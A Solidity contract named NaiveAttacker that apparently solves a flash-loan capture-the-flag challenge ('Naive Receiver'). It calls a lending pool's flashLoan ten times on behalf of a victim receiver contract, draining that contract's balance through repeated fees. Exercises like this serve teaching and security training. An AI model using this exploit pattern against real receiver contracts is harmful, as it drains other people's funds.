// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import './NaiveReceiverLenderPool.sol';
import './FlashLoanReceiver.sol';

contract NaiveAttacker {
    

    function attack(
        IERC3156FlashLender _pool,
        IERC3156FlashBorrower _receiver,
        uint256 _amount,
        address _token
    ) external {
        for (uint256 i = 0; i < 10; i++) {
            _pool.flashLoan(_receiver, _token, _amount, "0x");
        }
    }
}